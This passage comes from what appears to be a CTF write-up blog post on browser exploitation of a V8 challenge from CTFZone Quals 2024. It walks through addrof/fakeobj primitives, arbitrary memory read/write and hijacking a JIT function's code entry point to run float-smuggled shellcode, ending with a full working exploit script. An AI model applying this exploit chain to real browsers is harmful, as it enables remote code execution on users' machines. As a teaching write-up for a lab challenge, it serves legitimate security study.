</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">lower</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">brr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s turn these into arbitrary read and write. For that we need to construct a fake object whose values are under our control.</p>
<p>Lets take a look at an array object</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">temp</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">2.2</span><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0x045d0808f2a5 &lt;JSArray<span class="o">[</span>2<span class="o">]</span>&gt;
</span></span><span class="line"><span class="cl">V8 version 12.7.224.12
</span></span><span class="line"><span class="cl">d8&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/gx 0x045d0808f2a5-1
</span></span><span class="line"><span class="cl">0x45d0808f2a4:  0x08000725081cce15
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can use that as the map value for our fake object since we want the fake object to be an array. The next four bytes should have the address of the properties array and the next four is the length.
for example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/gx 0x045d0808f2a5+8-1
</span></span><span class="line"><span class="cl">0x45d0808f2ac:  0x000000040808f2bd
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we call fakeobj at the start of this fake structure which gives us an object we can totally control.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">temp</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">2.2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x08000725081cce15</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">temp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="mh">0x1fffe</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">temp_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">temp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fake_object</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">temp_addr</span><span class="o">+</span><span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we can change the address part of the second value in the structure to read or write to any memory, this gives us arbitrary read and write.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="nx">val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">temp_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">((</span><span class="mh">0x1fffe</span><span class="nx">n</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">temp_addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">((</span><span class="mh">0x1fffe</span><span class="nx">n</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So what&rsquo;s next? How do we escape the v8 sandbox and get RIP control?</p>
<p>If we look at the build arguments provided, we can see that <code>v8_enable_external_code_space</code> is set to <code>false</code>. On default (set to true), the code pointer it stored in a seperate region than the v8 heap. Now that its disabled, the code pointer is still there in v8 heap region.
You can refer to this <a class="link" href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html"  target="_blank" rel="noopener"
    >blog</a> for detailed explanation about this.</p>
<p>To simply put, Jitted Function objects have a <code>code</code> pointer. At an offset to this address we have <code>code_entry_point</code> pointer. This consists of the instructions which are going to be executed when the function is called. So if we overwrite that entry point value, we can hijack the control flow.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">pwn_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">pwn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">lower</span><span class="p">(</span><span class="nx">arb_read</span><span class="p">(</span><span class="nx">pwn_addr</span><span class="o">+</span><span class="mh">0xc</span><span class="nx">n</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">code_entry_rwx</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">code</span><span class="o">+</span><span class="mh">0x14</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">code</span><span class="o">+</span><span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span><span class="nx">code_entry_rwx</span><span class="o">+</span><span class="mh">0x60</span><span class="nx">n</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We smuggle the shellcode into the jitted function by converting it into floating-point numbers so that it is stored in hexadecimal form in memory. So we overwrite the code entry point to starting of the smuggled shellcode.</p>
<p><img src="https://hackmd.io/_uploads/HyEMl94iC.gif"
	
	
	
	loading="lazy"
	
		alt="Screen Recording 2024-08-22 at 3.42.28‚ÄØPM"
	
	
></p>
<h2 id="full-exploit">Full Exploit</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">d8</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;test/mjsunit/wasm/wasm-module-builder.js&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">fi_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">f_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">fi_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">i_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">fi_buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">i_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">i_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">lower</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">i</span><span class="o">&amp;</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">upper</span><span class="p">(</span><span class="nx">i</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nx">i</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">BigInt</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">start</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">content</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">start</span> <span class="o">+</span> <span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">pwn</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="mf">1.95538254221075331056310651818</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mf">1.95606125582421466942709801013</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mf">1.99957147195425773436923756715</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mf">1.95337673326740932133292175341</span><span class="nx">E</span><span class="o">-</span><span class="mi">246</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mf">2.63486047652296056448306022844</span><span class="nx">E</span><span class="o">-</span><span class="mi">284</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">arr1</span> <span class="o">=</span> <span class="p">[{}];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x10000</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">pwn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WasmModuleBuilder</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">array</span> <span class="o">=</span> <span class="nx">builder</span><span class="p">.</span><span class="nx">addArray</span><span class="p">(</span><span class="nx">kWasmI32</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">builder</span><span class="p">.</span><span class="nx">addFunction</span><span class="p">(</span><span class="s1">&#39;createArray&#39;</span><span class="p">,</span> <span class="nx">makeSig</span><span class="p">([</span><span class="nx">kWasmI32</span><span class="p">],</span> <span class="p">[</span><span class="nx">kWasmExternRef</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">addBody</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kExprLocalGet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kGCPrefix</span><span class="p">,</span> <span class="nx">kExprArrayNewDefault</span><span class="p">,</span> <span class="nx">array</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">kGCPrefix</span><span class="p">,</span> <span class="nx">kExprExternConvertAny</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">          <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">exportFunc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">write_val</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span><span class="nx">val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">instance</span> <span class="o">=</span> <span class="nx">builder</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">({});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">wasm</span> <span class="o">=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">w_array</span> <span class="o">=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nx">createArray</span><span class="p">(</span><span class="mh">0x082d0641</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">w_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Target arr length --&gt; &#34;</span> <span class="o">+</span> <span class="nx">arr2</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">arr1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">lower</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr2</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">arr2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">arr1</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span><span class="nx">val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">temp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">((</span><span class="mh">0x1fffe</span><span class="nx">n</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">temp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nx">itof</span><span class="p">((</span><span class="mh">0x1fffe</span><span class="nx">n</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">)</span><span class="o">+</span><span class="nx">addr</span><span class="o">-</span><span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake_object</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">temp</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">1.1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x08000725081cce15</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">temp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="nx">itof</span><span class="p">(</span><span class="mh">0x1fffe</span><span class="nx">n</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">temp_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">temp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">hex</span><span class="p">(</span><span class="nx">temp_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">fake_object</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">temp_addr</span><span class="o">+</span><span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">pwn_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">pwn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">pwn_addr</span><span class="o">+</span><span class="mh">0xc</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">hex</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">code_start</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">code</span><span class="o">+</span><span class="mh">0x14</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">arb_write</span><span class="p">(</span><span class="nx">code</span><span class="o">+</span><span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span><span class="nx">code_start</span><span class="o">+</span><span class="mh">0x60</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Pwned!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="conclusion">Conclusion</h2>
<p>It was fun solving this, thanks to the author @phoen1xxx for helping me out. There was another browser challenge from the CTF, which was a Mojo IPC challenge. Will try to solve that and make a writeup on that as well.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctfzone-quals-2024/">CTFZone Quals 2024</a>
        
            <a href="/tags/v8/">V8</a>
        
            <a href="/tags/browser-exploitation/">Browser Exploitation</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/the-holy-hole-analysis-of-cve-2023-2033/">
        
        

        <div class="article-details">
            <h2 class="article-title">The Holy Hole - Analysis of CVE-2023-2033</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/posts/irisctf-2024-sequilitis/">
        
        

        <div class="article-details">
            <h2 class="article-title">IrisCTF 2024 - Sequilitis</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/posts/notes-on-cve-2016-4622/">
        
        

        <div class="article-details">
